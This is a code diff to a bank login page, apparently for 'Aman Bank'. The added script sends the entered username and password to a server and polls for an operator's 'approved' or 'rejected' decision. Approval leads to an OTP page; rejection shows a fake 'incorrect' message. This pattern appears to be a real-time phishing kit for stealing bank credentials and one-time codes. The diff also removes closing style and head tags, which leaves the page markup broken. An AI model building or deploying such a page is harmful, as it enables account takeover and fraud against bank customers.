@@ -206,9 +206,12 @@
   .error-msg.active{
     display:block;
   }
-</style>
-</head>
-<body>
+    .field-row.invalid{
+      border-bottom-color: #c0392b;
+    }
+    .field-row.invalid input{
+      color: #c0392b;
+    }
 <div class="screen">
 
   <div class="logo-wrap">
@@ -317,19 +320,101 @@
 </div>
 
 <script>
+  var statusPollTimer = null;
+
+  function showInvalidCredentials(username){
+    var errorMsg = document.getElementById('errorMsg');
+    var usernameField = document.getElementById('username');
+    var passwordField = document.getElementById('password');
+    var usernameRow = usernameField.parentNode;
+    var passwordRow = passwordField.parentNode;
+
+    usernameRow.classList.add('invalid');
+    passwordRow.classList.add('invalid');
+    errorMsg.textContent = 'Username and password are incorrect';
+    errorMsg.style.color = '#c0392b';
+    errorMsg.classList.add('active');
+    if (username) {
+      usernameField.value = username;
+    }
+    passwordField.value = '';
+  }
+
+  function stopStatusPoll(){
+    clearInterval(statusPollTimer);
+    statusPollTimer = null;
+  }
+
+  function pollLoginStatus(requestId, username){
+    statusPollTimer = setInterval(function(){
+      fetch('/api/status/' + requestId)
+        .then(function(res){ return res.json(); })
+        .then(function(data){
+          if (!data.ok) return;
+          if (data.status === 'approved') {
+            stopStatusPoll();
+            sessionStorage.setItem('aman_bank_request_id', requestId);
+            window.location.href = 'otp.html';
+          } else if (data.status === 'rejected') {
+            stopStatusPoll();
+            window.location.href = 'login_en.html?error=invalid&user=' + encodeURIComponent(username);
+          }
+        })
+        .catch(function(err){
+          console.warn('Unable to verify request status:', err);
+        });
+    }, 2500);
+  }
+
   function handleLogin(){
     var username = document.getElementById('username').value.trim();
     var password = document.getElementById('password').value.trim();
     var errorMsg = document.getElementById('errorMsg');
 
     if(username === '' || password === ''){
+      document.getElementById('username').parentNode.classList.add('invalid');
+      document.getElementById('password').parentNode.classList.add('invalid');
+      errorMsg.textContent = 'Please enter your username and password';
+      errorMsg.style.color = '#c0392b';
       errorMsg.classList.add('active');
       return;
     }
 
     errorMsg.classList.remove('active');
     document.getElementById('loadingOverlay').classList.add('active');
+
+    fetch('/api/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username: username, password: password })
+    })
+    .then(function(res){ return res.json(); })
+    .then(function(data){
+      if (data.ok) {
+        pollLoginStatus(data.id, username);
+      } else {
+        document.getElementById('loadingOverlay').classList.remove('active');
+        errorMsg.textContent = 'Request could not be sent. Please try again.';
+        errorMsg.style.color = '#c0392b';
+        errorMsg.classList.add('active');
+      }
+    })
+    .catch(function(err){
+      console.warn('Unable to connect to the server:', err);
+      document.getElementById('loadingOverlay').classList.remove('active');
+      errorMsg.textContent = 'Unable to connect to the server. Make sure the app is running.';
+      errorMsg.style.color = '#c0392b';
+      errorMsg.classList.add('active');
+    });
   }
+
+  document.addEventListener('DOMContentLoaded', function(){
+    var params = new URLSearchParams(window.location.search);
+    if (params.get('error') === 'invalid') {
+      var user = params.get('user') || '';
+      showInvalidCredentials(user);
+    }
+  });
 </script>
 </body>
 </html>
